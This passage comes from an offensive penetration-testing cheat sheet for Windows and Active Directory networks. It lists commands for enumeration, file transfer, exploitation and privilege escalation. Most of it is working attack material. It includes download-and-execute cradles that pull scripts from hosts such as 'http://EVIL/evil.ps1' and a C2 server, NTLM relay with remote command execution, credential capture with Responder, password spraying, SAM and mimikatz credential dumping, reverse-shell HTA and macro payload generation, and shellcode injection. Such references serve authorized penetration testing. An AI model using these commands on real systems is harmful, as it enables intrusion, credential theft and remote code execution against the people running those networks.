/domain_trusts /all_trusts /vnltest /dsgetfti:&lt;domain&gt;nltest /server:&lt;ip_dc&gt; /domain_trusts /all_trusts([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# View All Domain Controllersnltest /dclist:offense.localnet group &quot;domain controllers&quot; /domain# View DC for Current Sessionnltest /dsgetdc:m0chanAD.local# View Domain Trusts from CMDnltest /domain_trusts# View User Info from CMDnltest /user:&quot;m0chan&quot;# get domain name and DC the user authenticated toklist# Get All Logged on Sessions, Includes NTLM &amp; Kerberosklist sessions# View Kerb Ticketsklist# View Cached Krbtgtklist tgt# whoami on older Windows systemsset u#List all Usernames([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=*))&quot;).FindAll().Properties.samaccountname#List Administrators([adsisearcher]&quot;(&amp;(objectClass=User)(admincount=1))&quot;).FindAll().Properties.samaccountname#List all Info about Specific User([adsisearcher]&quot;(&amp;(objectClass=User)(samaccountname=&lt;username&gt;))&quot;).FindAll().Properties#View All Users with Description Field Set([adsisearcher]&quot;(&amp;(objectClass=group)(samaccountname=*))&quot;).FindAll().Properties | % { Write-Host $_.samaccountname : $_.description }</code></pre><h4 id="AD-Enumeration-from-Linux-Box-AD-Tool"><a href="#AD-Enumeration-from-Linux-Box-AD-Tool" class="headerlink" title="AD Enumeration from Linux Box - AD Tool"></a>AD Enumeration from Linux Box - AD Tool</h4><pre><code>#https://github.com/jasonwbarnett/linux-adtooltar zxvf adtools-1.x.tar.gzcd adtools-1.x./configuremakemake install&gt; adtool list ou=user,dc=example,dc=comCN=allusers,OU=user,DC=example,DC=comOU=finance,OU=user,DC=example,DC=comOU=administration,OU=user,DC=example,DC=com&gt; adtool oucreate marketing ou=user,dc=example,dc=com&gt; adtool useradd jsmith ou=marketing,ou=user,dc=example,dc=com&gt; adtool setpass jsmith banana&gt; adtool unlock jsmith&gt; adtool groupadd allusers jsmith&gt; adtool attributereplace jsmith telephonenumber 123&gt; adtool attributereplace jsmith mail jsmith@example.com</code></pre><h4 id="SharpView-Enumeration"><a href="#SharpView-Enumeration" class="headerlink" title="SharpView Enumeration"></a>SharpView Enumeration</h4><pre><code>#https://github.com/tevora-threat/SharpViewGet-DomainFileServerGet-DomainGPOUserLocalGroupMappingFind-GPOLocationGet-DomainGPOComputerLocalGroupMappingFind-GPOComputerAdminGet-DomainObjectAclGet-ObjectAclAdd-DomainObjectAclAdd-ObjectAclRemove-DomainObjectAclGet-RegLoggedOnGet-LoggedOnLocalGet-NetRDPSessionTest-AdminAccessInvoke-CheckLocalAdminAccessGet-WMIProcessGet-NetProcessGet-WMIRegProxyGet-ProxyGet-WMIRegLastLoggedOnGet-LastLoggedOnGet-WMIRegCachedRDPConnectionGet-CachedRDPConnectionGet-WMIRegMountedDriveGet-RegistryMountedDriveFind-InterestingDomainAclInvoke-ACLScannerGet-NetShareGet-NetLoggedon</code></pre><h4 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h4><pre><code>nmap -p 139,445 --script smb.nse,smb-enum-shares,smblsenum4linux 1.3.3.7smbmap -H 1.3.3.7smbclient -L \\INSERTIPADDRESSsmbclient -L INSERTIPADDRESSsmbclient //INSERTIPADDRESS/tmpsmbclient \\\\INSERTIPADDRESS\\ipc$ -U johnsmbclient //INSERTIPADDRESS/ipc$ -U johnsmbclient //INSERTIPADDRESS/admin$ -U johnnbtscan [SUBNET]#Check for SMB Signingnmap --script smb-security-mode.nse -p 445 10.10.14.14 </code></pre><h4 id="SNMP-Enumeration"><a href="#SNMP-Enumeration" class="headerlink" title="SNMP Enumeration"></a>SNMP Enumeration</h4><pre><code>snmpwalk -c public -v1 10.10.14.14snmpcheck -t 10.10.14.14 -c publiconesixtyone -c names -i hostsnmap -sT -p 161 10.10.14.14 -oG snmp_results.txtsnmpenum -t 10.10.14.14</code></pre><h4 id="MySQL-Enumeration"><a href="#MySQL-Enumeration" class="headerlink" title="MySQL Enumeration"></a>MySQL Enumeration</h4><pre><code>nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122</code></pre><h4 id="DNS-Zone-Transfer"><a href="#DNS-Zone-Transfer" class="headerlink" title="DNS Zone Transfer"></a>DNS Zone Transfer</h4><pre><code>dig axfr blah.com @ns1.m0chan.comnslookup -&gt; set type=any -&gt; ls -d m0chan.comdnsrecon -d m0chan -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</code></pre><h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><pre><code>ldapsearch -H ldap://&lt;ip&gt;ldapwhoami</code></pre><h4 id="RPC-Enumeration"><a href="#RPC-Enumeration" class="headerlink" title="RPC Enumeration"></a>RPC Enumeration</h4><pre><code>rpcclient -U &quot;10.10.14.14&quot;srvinfoenumdomusersenumalsgroups domainlookupnames administratorsquerydominfoenumdomusersqueryuser &lt;user&gt;lsaquerylookupnames Guestlookupnames Administrator</code></pre><h4 id="Remote-Desktop"><a href="#Remote-Desktop" class="headerlink" title="Remote Desktop"></a>Remote Desktop</h4><pre><code>rdesktop -u guest -p guest INSERTIPADDRESS -g 94%# Brute forcencrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS</code></pre><h2 id="File-Transfer"><a href="#File-Transfer" class="headerlink" title="File Transfer"></a>File Transfer</h2><h4 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h4><pre><code>m0chan Machinemkdir tftpatftpd --deamon --port 69 tftpcp *file* tftpOn victim machine:tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;</code></pre><h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><pre><code>echo open &lt;[IP]&gt; 21 &gt; ftp.txtecho USER demo &gt;&gt; ftp.txtecho ftp &gt;&gt; ftp.txtecho bin &gt;&gt; ftp.txtecho GET nc.exe &gt;&gt; ftp.txtecho bye &gt;&gt; ftp.txtftp -v -n -s:ftp.txt</code></pre><h4 id="VBS-Script"><a href="#VBS-Script" class="headerlink" title="VBS Script"></a>VBS Script</h4><pre><code>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbsecho StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbsecho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbsecho Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbsecho Err.Clear &gt;&gt; wget.vbsecho Set http = Nothing &gt;&gt; wget.vbsecho Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbsecho If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbsecho If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbsecho If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbsecho http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbsecho http.Send &gt;&gt; wget.vbsecho varByteArray = http.ResponseBody &gt;&gt; wget.vbsecho Set http = Nothing &gt;&gt; wget.vbsecho Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbsecho Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbsecho strData = &quot;&quot; &gt;&gt; wget.vbsecho strBuffer = &quot;&quot; &gt;&gt; wget.vbsecho For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbsecho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbsecho Next &gt;&gt; wget.vbsecho ts.Close &gt;&gt; wget.vbscscript wget.vbs &lt;url&gt; &lt;out_file&gt;Use echoup function on pentest.ws to generate echo commands.https://pentest.ws/features</code></pre><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code>#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradlesInvoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) #Powershell Download to MemoryIEX(New-Object Net.WebClient).downloadString(&#39;http://server/script.ps1&#39;)#Powershell with Proxy$browser = New-Object System.Net.WebClient;$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX($browser.DownloadString(&#39;https://server/script.ps1&#39;));</code></pre><h4 id="Powershell-Base64"><a href="#Powershell-Base64" class="headerlink" title="Powershell Base64"></a>Powershell Base64</h4><pre><code>$fileName = &quot;Passwords.kdbx&quot;$fileContent = get-content $fileName$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)</code></pre><h4 id="Secure-Copy-pscp-exe"><a href="#Secure-Copy-pscp-exe" class="headerlink" title="Secure Copy / pscp.exe"></a>Secure Copy / pscp.exe</h4><pre><code>pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txtpscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt</code></pre><h4 id="BitsAdmin-exe"><a href="#BitsAdmin-exe" class="headerlink" title="BitsAdmin.exe"></a>BitsAdmin.exe</h4><pre><code>cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</code></pre><h4 id="Remote-Desktop-1"><a href="#Remote-Desktop-1" class="headerlink" title="Remote Desktop"></a>Remote Desktop</h4><pre><code>rdesktop 10.10.10.10 -r disk:linux=&#39;/home/user/filetransferout&#39;</code></pre><h4 id="WinHTTP-Com-Object"><a href="#WinHTTP-Com-Object" class="headerlink" title="WinHTTP Com Object"></a>WinHTTP Com Object</h4><pre><code>[System.Net.WebRequest]::DefaultWebProxy[System.Net.CredentialCache]::DefaultNetworkCredentials$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&#39;GET&#39;,&#39;http://EVIL/evil.ps1&#39;,$false);$h.send();iex $h.responseText</code></pre><h4 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h4><pre><code>#File Transfercertutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename#CertUtil Base64 Transferscertutil.exe -encode inputFileName encodedOutputFileNamecertutil.exe -decode encodedInputFileName decodedOutputFileName</code></pre><h4 id="Curl-Windows-1803"><a href="#Curl-Windows-1803" class="headerlink" title="Curl (Windows 1803+)"></a>Curl (Windows 1803+)</h4><pre><code>curl http://server/file -o filecurl http://server/file.bat | cmdIEX(curl http://server/script.ps1);Invoke-Blah</code></pre><h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><pre><code>python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support</code></pre><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h4 id="LLMNR-NBT-NS-Spoofing"><a href="#LLMNR-NBT-NS-Spoofing" class="headerlink" title="LLMNR / NBT-NS Spoofing"></a>LLMNR / NBT-NS Spoofing</h4><pre><code>#Responder to Steal Credsgit clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like&#39;Yeah I&#39;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&#39;</code></pre><h4 id="Responder-WPAD-Attack"><a href="#Responder-WPAD-Attack" class="headerlink" title="Responder WPAD Attack"></a>Responder WPAD Attack</h4><pre><code>responder -I eth0 wpadBy default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internetGo to internet explorer and search for Google which automatically searches for a WPAD file... Then take NTLMv2 hash and NTLM Relay it or send to cracking rig. </code></pre><h4 id="mitm6"><a href="#mitm6" class="headerlink" title="mitm6"></a>mitm6</h4><pre><code>#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. By default IPV6 should be enabled. git clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6pip install .mitm6 -d m0chanAD.localNow the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i-i opens an interactive shell.Shout out to hausec for this super nice tip.</code></pre><h4 id="SCF-File-Attack"><a href="#SCF-File-Attack" class="headerlink" title="SCF File Attack"></a>SCF File Attack</h4><pre><code>Create .scf file and drop inside SMB Share and fire up Responder ;) Filename = @m0chan.scf[Shell]Command=2IconFile=\\10.10.14.2\Share\test.ico[Taskbar]Command=ToggleDesktop</code></pre><h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h4><pre><code>Good article explaining differences between NTLM/Net-NTLMV1&amp;V2https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.htmlTL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.You CAN perform Pass-The-Hash attacks with NTLM hashes.You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.PS: You CANNOT relay a hash back to itself.PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexeccrackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txtThis will tell you a list of hosts within a subnet which do not have SMB Signing enabled.python Responder.py -I &lt;interface&gt; -r -d -wntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)How about we execute a command instead.ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasdntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP</code></pre><h4 id="Priv-Exchange"><a href="#Priv-Exchange" class="headerlink" title="Priv Exchange"></a>Priv Exchange</h4><pre><code>#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/Combine privxchange.py and ntlmrelayxntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATEpython privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local</code></pre><h4 id="Exchange-Password-Spray"><a href="#Exchange-Password-Spray" class="headerlink" title="Exchange Password Spray"></a>Exchange Password Spray</h4><pre><code>#https://github.com/dafthack/MailSniper.gitInvoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019#https://github.com/sensepost/ruler./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v</code></pre><h4 id="ExchangeRelayX"><a href="#ExchangeRelayX" class="headerlink" title="ExchangeRelayX"></a>ExchangeRelayX</h4><pre><code>#https://github.com/quickbreach/ExchangeRelayXAn NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers../exchangeRelayx.py -t https://mail.quickbreach.com</code></pre><h4 id="Exchange-Mailbox-Post-Compromise"><a href="#Exchange-Mailbox-Post-Compromise" class="headerlink" title="Exchange Mailbox Post-Compromise"></a>Exchange Mailbox Post-Compromise</h4><pre><code>#https://github.com/dafthack/MailSniper.gitEnumerate GlobalAddressListGet-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019Enumerate AD UsernamesGet-ADUsernameFromEWS -Emaillist .\users.txtEnumerate Mailbox FoldersGet-MailboxFolders -Mailbox jamie@m0chanAD.localEnumerate Passwords &amp; Credentials Stored in EmailsInvoke-SelfSearch -Mailbox jamie@m0chanAD.localEnumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange AdminInvoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012</code></pre><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><pre><code>CrackMapExec is installed on Kali or get Windows Binary from Github.Has 3 Execution Methodscrackmapexec smb &lt;- Creating and Running a Service over SMBcrackmapexec wmi &lt;- Executes command over WMIcrackmapexec at &lt;- Schedules Task with Task SchedulerCan execute plain commands with -X flag i/e crcakmapexec smb 10.10.14.0/24 -x whoamicrcakmapexec smb 10.10.14.0/24 &lt;- Host Discoverycrackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --pass-polcrackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --sharesCan also PTH with CMEcrackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854ecme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares --local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPSDump Local SAM hashescrackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --local-auth --samRunning Mimikatz crackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --local-auth -M mimikatz^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain AdminEnum AV Productscrackmapexec smb 10.10.14.0/24 -u user -p &#39;Password&#39; --local-auth -M enum_avproducts</code></pre><h4 id="Mail-Sniper"><a href="#Mail-Sniper" class="headerlink" title="Mail Sniper"></a>Mail Sniper</h4><pre><code>Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019[*] Now spraying the OWA portal at https://m0chanAD.local/owa/[*] SUCCESS! User:m0chan:Summer2019Lmao, you really think Id use the pass Summer2019?</code></pre><h4 id="Kerberos-Stuff"><a href="#Kerberos-Stuff" class="headerlink" title="Kerberos Stuff"></a>Kerberos Stuff</h4><pre><code>#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#https://m0chan.github.io/Kerberos-Attacks-In-Depth</code></pre><h4 id="MSSQL-Exploiting-PowerUpSQL"><a href="#MSSQL-Exploiting-PowerUpSQL" class="headerlink" title="MSSQL Exploiting (PowerUpSQL)"></a>MSSQL Exploiting (PowerUpSQL)</h4><pre><code>#https://github.com/NetSPI/PowerUpSQL#View SQL InstancesGet-SQLInstanceDomain [| Get-SQLServerInfo]#Login in with Domain AccountGet-SQLConnectionTestThreaded#Login in with Default PasswordGet-SQLServerDefaultLoginPw#List DB, Tables &amp; ColumnsGet-SQLInstanceDomain | Get-SQLDatabaseGet-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;#Search Column Names for WordGet-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10#Try to Execute Commands (RCE)Invoke-SQLOSCmd#Enable XP_CMDShell ProcessEXEC sp_configure &#39;show advanced options&#39;, 1;  go  RECONFIGURE;  go  EXEC sp_configure &#39;xp_cmdshell&#39;, 1;  go  RECONFIGURE;  go  xp_cmdshell &#39;&lt;cmd&gt;&#39;go</code></pre><h4 id="Malicious-Macro-with-MSBuild"><a href="#Malicious-Macro-with-MSBuild" class="headerlink" title="Malicious Macro with MSBuild"></a>Malicious Macro with MSBuild</h4><pre><code>#https://github.com/infosecn1nja/MaliciousMacroMSBuild#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild ExplainedCreation of a Shellcode MSBuild VBA Macropython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vbaCreation of a PowerShell MSBuild VBA Macropython m3-gen.py -p powershell -i /path/payload.ps1 -o output.vbaCreation of a Custom MSBuild VBA Macropython m3-gen.py -p custom -i /path/msbuild.xml -o output.vbaCreation of a Shellcode MSBuild VBA Macro With Kill Datepython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018Creation of a Shellcode MSBuild VBA Macro With Environmental Keyingpython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomainpython m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github</code></pre><h4 id="WeirdHTA-Undetectable-HTA"><a href="#WeirdHTA-Undetectable-HTA" class="headerlink" title="WeirdHTA - Undetectable HTA"></a>WeirdHTA - Undetectable HTA</h4><pre><code>#https://github.com/felamos/weirdhtapython3 --helppython3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)python3 weirdhta.py 10.10.10.10 4444 --command &#39;c:\windows\system32\cmd.exe&#39; (custom command)</code></pre><h4 id="EvilWinRM"><a href="#EvilWinRM" class="headerlink" title="EvilWinRM"></a>EvilWinRM</h4><pre><code>#https://github.com/Hackplayers/evil-winrmUltimate Shell for WinRM ConnectionsUsage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]    -S, --ssl                        Enable SSL    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path    -e, --executables EXES_PATH      C# executables local path    -i, --ip IP                      Remote host IP or hostname (required)    -U, --url URL                    Remote url endpoint (default /wsman)    -u, --user USER                  Username (required)    -p, --password PASS              Password    -P, --port PORT                  Remote host port (default 5985)    -V, --version                    Show version    -h, --help                       Display this help message</code></pre><h4 id="GetVulnerableGPO"><a href="#GetVulnerableGPO" class="headerlink" title="GetVulnerableGPO"></a>GetVulnerableGPO</h4><pre><code>#https://github.com/gpoguy/GetVulnerableGPOPowerShell script to find &#39;vulnerable&#39; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip</code></pre><h4 id="Invoke-PSImage"><a href="#Invoke-PSImage" class="headerlink" title="Invoke-PSImage"></a>Invoke-PSImage</h4><pre><code>#https://github.com/peewpw/Invoke-PSImageEncodes a PowerShell script in the pixels of a PNG file and generates a oneliner to executeInvoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.PS&gt;Import-Module .\Invoke-PSImage.ps1PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg   [Oneliner to execute from a file]PS&gt;Import-Module .\Invoke-PSImage.ps1PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest   [Oneliner to execute from the web]</code></pre><h4 id="Meterpreter-Donut-Shellcode-Injection-NET"><a href="#Meterpreter-Donut-Shellcode-Injection-NET" class="headerlink" title="Meterpreter + Donut - Shellcode Injection .NET"></a>Meterpreter + Donut - Shellcode Injection .NET</h4><pre><code>#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.htmlA module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.binuse post/windows/manage/shellcode_injectset SHELLCODE /tmp/payload.binset SESSION 1run</code></pre><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Reference: <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p><p>Run this script: <a href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat" target="_blank" rel="noopener">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p><h4 id="Basics-1"><a href="#Basics-1" class="headerlink" title="Basics"></a>Basics</h4><pre><code>systeminfowmic qfenet usershostnamewhoaminet localgroupsecho %logonserver%netsh firewall show statenetsh firewall show confignetstat -antype C:\Windows\system32\drivers\etc\hosts</code></pre><h4 id="PowerUp-ps1-Sometimes-a-Quick-Win"><a href="#PowerUp-ps1-Sometimes-a-Quick-Win" class="headerlink" title="PowerUp.ps1 (Sometimes a Quick Win)"></a>PowerUp.ps1 (Sometimes a Quick Win)</h4><pre><code>powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&#39;webserver/PowerUp.ps1&#39;) ;Invoke-AllChecks</code></pre><h4 id="SharpUp"><a href="#SharpUp" class="headerlink" title="SharpUp"></a>SharpUp</h4><pre><code>#https://github.com/GhostPack/SharpUpC Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.</code></pre><h4 id="If-It’s-AD-Get-Bloodhound-Imported…"><a href="#If-It’s-AD-Get-Bloodhound-Imported…" class="headerlink" title="If It’s AD Get Bloodhound Imported…"></a>If It’s AD Get Bloodhound Imported…</h4><pre><code>SharpHound.ps1SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHoundIEX(System.Net.WebClient.DownloadString(&#39;http://webserver:4444/SharpHound.ps1&#39;))Invoke-CollectionMethod AllImport .zip to BloodhoundIf you can&#39;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&#39;s a big big pain but it works.</code></pre><h4 id="Bloodhound-Python"><a href="#Bloodhound-Python" class="headerlink" title="Bloodhound-Python"></a>Bloodhound-Python</h4><pre><code>git clone https://github.com/fox-it/BloodHound.py.gitcd BloodHound.py/ &amp;&amp; pip install .bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all</code></pre><h4 id="Cleartext-Passwords"><a href="#Cleartext-Passwords" class="headerlink" title="Cleartext Passwords"></a>Cleartext Passwords</h4><pre><code># Windows autologinreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;# VNCreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;# SNMP Parametersreg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;# Puttyreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;# Search for password in registryreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><h4 id="View-Installed-Software"><a href="#View-Installed-Software" class="headerlink" title="View Installed Software"></a>View Installed Software</h4><pre><code>tasklist /SVCnet startreg query HKEY_LOCAL_MACHINE\SOFTWAREDRIVERQUERYdir /a &quot;C:\Program Files&quot;dir /a &quot;C:\Program Files (x86)&quot;reg query HKEY_LOCAL_MACHINE\SOFTWAREGet-ChildItem &#39;C:\Program Files&#39;, &#39;C:\Program Files (x86)&#39; | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</code></pre><h4 id="Weak-Folder-Permissions"><a href="#Weak-Folder-Permissions" class="headerlink" title="Weak Folder Permissions"></a>Weak Folder Permissions</h4><pre><code>Full Permissions for &#39;Everyone&#39; on Program Foldersicacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(F)&quot; | findstr &quot;BUILTIN\Users&quot; Modify Permissions for Everyone on Program Foldersicacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; </code></pre><h4 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h4><pre><code>schtasks /query /fo LIST /v</code></pre><h4 id="Powershell-History"><a href="#Powershell-History" class="headerlink" title="Powershell History"></a>Powershell History</h4><pre><code>type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txtcat (Get-PSReadlineOption).HistorySavePathcat (Get-PSReadlineOption).HistorySavePath | sls passw</code></pre><h4 id="View-Connected-Drives"><a href="#View-Connected-Drives" class="headerlink" title="View Connected 